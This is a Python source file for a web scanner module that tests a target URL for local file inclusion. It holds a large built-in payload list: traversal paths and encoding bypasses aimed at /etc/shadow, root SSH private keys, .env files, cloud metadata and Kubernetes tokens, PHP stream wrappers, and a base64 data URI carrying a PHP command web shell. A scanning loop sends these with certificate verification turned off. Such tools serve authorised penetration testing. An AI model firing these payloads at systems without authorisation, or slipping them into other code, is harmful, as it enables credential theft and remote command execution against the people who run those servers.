"""
LFI Scanner
Detects Local File Inclusion vulnerabilities
"""

import logging
import re

import urllib3

from ..config import Config
from .base import BaseScanner

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger(__name__)


class LFIScanner(BaseScanner):
    """Local File Inclusion vulnerability scanner"""

    def __init__(self, target, payload_file, output_file=None, dynamic_payloads=None):
        super().__init__(target, output_file)
        self.payload_file = payload_file
        self.dynamic_payloads = dynamic_payloads
        self.lfi_patterns = {
            "unix_passwd": (r"root:.*:0:0:", r"nobody:\w+:\d+:\d+:"),
            "win_ini": (r"\[boot loader\]", r"timeout=\d+"),
            "proc_self": (r"Name:\s+\w+\nState:\s+[RSDZT]", r"Pid:\s+\d+"),
            "etc_hosts": (r"127\.0\.0\.1\s+localhost", r"::1\s+localhost"),
            "apache_config": (r'DocumentRoot\s+["\']/\w+', r'<Directory\s+["\']'),
            "nginx_config": (r"worker_processes\s+\w+;", r"http\s*{"),
            "ssh_config": (r"AuthorizedKeysFile", r"PasswordAuthentication\s+(yes|no)"),
        }

    def get_payloads(self):
        """Load LFI payloads"""
        # Modern 2025 LFI/Path Traversal payloads
        default_payloads = [
            # Classic Linux/Unix
            "../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\etc\\passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "../../../../../../../../../etc/passwd",
            # Absolute paths
            "/etc/passwd",
            "/etc/shadow",
            "/etc/group",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/issue",
            # Classic Windows
            "..\\..\\..\\windows\\system.ini",
            "..\\..\\..\\..\\..\\windows\\system.ini",
            "../../../../windows/system.ini",
            "../../../../boot.ini",
            "../../../../windows/win.ini",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\system.ini",
            # 2025 Advanced bypasses - Null byte
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd\x00",
            # URL encoding bypasses
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",  # Double encoding
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            # Unicode/UTF-8 bypasses (2025)
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            # Overlong UTF-8
            "%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/etc/passwd",
            # 16-bit Unicode encoding
            "..%u002f..%u002f..%u002fetc%u002fpasswd",
            # Path truncation (2025)
            "../../../etc/passwd" + "A" * 5000,
            "../../../etc/passwd/" + "." * 5000,
            # Filter bypass - case variation
            "../../../ETC/passwd",
            "../../../eTc/passwd",
            # Reverse traversal
            "....//....//....//etc/passwd",
            "..../..../..../etc/passwd",
            r"....\\....\\....\\windows\system.ini",
            # Proc filesystem (Linux)
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/stat",
            "/proc/self/status",
            "/proc/self/fd/0",
            "/proc/self/fd/1",
            "/proc/self/fd/2",
            "../../../proc/self/environ",
            # Log files (2025 common locations)
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/httpd/access_log",
            "/var/log/httpd/error_log",
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/nginx/access.log",
            # PHP wrappers (2025)
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
            "php://input",
            "php://stdin",
            "php://fd/0",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://ls",
            "zip://archive.zip#shell.php",
            "phar://phar.phar/shell.php",
            # Config files (2025)
            "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf",
            "/etc/mysql/my.cnf",
            "/etc/php/7.4/apache2/php.ini",
            "/etc/php/8.0/fpm/php.ini",
            "/usr/local/apache2/conf/httpd.conf",
            "../../../../etc/apache2/apache2.conf",
            # SSH keys
            "/root/.ssh/id_rsa",
            "/root/.ssh/id_dsa",
            "/root/.ssh/authorized_keys",
            "/home/user/.ssh/id_rsa",
            "../../../../root/.ssh/id_rsa",
            # Application-specific (2025)
            "../../../../var/www/html/.env",
            "../../../../.env",
            "../../../../.git/config",
            "../../../../composer.json",
            "../../../../package.json",
            "../../../../web.config",
            "../../../../application.properties",
            # Cloud metadata endpoints (SSRF/LFI combo)
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            # Container escapes (2025)
            "file:///etc/passwd",
            "file:///proc/self/environ",
            "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
            # Java-specific
            "WEB-INF/web.xml",
            "WEB-INF/classes/application.properties",
            "../../../../WEB-INF/web.xml",
            # Node.js/Express (2025)
            "../../../../.npmrc",
            "../../../../package-lock.json",
            # Database configs
            "../../../../var/lib/mysql/mysql/user.MYD",
            "../../../../etc/postgresql/postgresql.conf",
        ]

        if self.dynamic_payloads:
            return self.dynamic_payloads

        # Load custom payloads from file if provided
        if self.payload_file:
            try:
                with open(self.payload_file, "r") as f:
                    custom_payloads = [
                        line.strip()
                        for line in f
                        if line.strip() and not line.startswith("#")
                    ]
                    default_payloads.extend(custom_payloads)
                    logger.info(f"Loaded {len(custom_payloads)} custom LFI payloads")
                    print(
                        f"{Config.COLOR_GREEN}[*] Loaded {len(custom_payloads)} custom payloads{Config.COLOR_RESET}\n"
                    )
            except Exception as e:
                logger.error(f"Error reading payload file: {e}")
                print(
                    f"{Config.COLOR_ORANGE}[-] Using default payloads only{Config.COLOR_RESET}\n"
                )

        return default_payloads

    def scan(self):
        """Execute LFI scan"""
        print(
            f"\n{Config.COLOR_BLUE}[*] Starting Greaper LFI scanner on {self.target}{Config.COLOR_RESET}"
        )

        payloads = self.get_payloads()
        if not payloads:
            return

        # Get baseline response
        try:
            baseline_response = self.make_request(
                self.target.replace("FUZZ", ""), verify=False, allow_redirects=False
            )
            baseline_length = len(baseline_response.text)
            baseline_content = baseline_response.text
        except Exception as e:
            logger.error(f"Error getting baseline response: {e}")
            print(
                f"{Config.COLOR_RED}[-] Error getting baseline response: {str(e)}{Config.COLOR_RESET}"
            )
            return

        found_vulnerabilities = []

        for payload in payloads:
            lfi_test_url = self.target.replace("FUZZ", payload)
            try:
                response = self.make_request(
                    lfi_test_url, verify=False, allow_redirects=False
                )

                # Skip if response is too similar to baseline
                if (
                    abs(len(response.text) - baseline_length) < 10
                    or response.text == baseline_content
                    or response.status_code == 404
                ):
                    print(
                        f"{Config.COLOR_RED}[-] No LFI found for payload: {payload}{Config.COLOR_RESET}"
                    )
                    continue

                # Enhanced validation with multiple pattern matching
                found_patterns = []
                for file_type, patterns in self.lfi_patterns.items():
                    if all(re.search(pattern, response.text) for pattern in patterns):
                        found_patterns.append(file_type)

                if found_patterns:
                    result = f"[+] Potential LFI found on {lfi_test_url}  With file: {payload}"
                    print(f"{Config.COLOR_GREEN}{result}{Config.COLOR_RESET}")
                    found_vulnerabilities.append(result)
                else:
                    print(
                        f"{Config.COLOR_RED}[-] No LFI found for payload: {payload}{Config.COLOR_RESET}"
                    )
            except Exception as e:
                logger.error(f"Error testing payload: {e}")
                print(
                    f"{Config.COLOR_RED}[-] No LFI found for payload: {payload}{Config.COLOR_RESET}"
                )
                continue

        self.results = found_vulnerabilities

        print(f"\n{Config.COLOR_BLUE}[*] Scan Summary:{Config.COLOR_RESET}")
        if found_vulnerabilities:
            print(
                f"{Config.COLOR_GREEN}[+] Found {len(found_vulnerabilities)} potential LFI vulnerabilities{Config.COLOR_RESET}"
            )
            self.save_results()
        else:
            print(
                f"{Config.COLOR_RED}[-] No LFI vulnerabilities found{Config.COLOR_RESET}"
            )
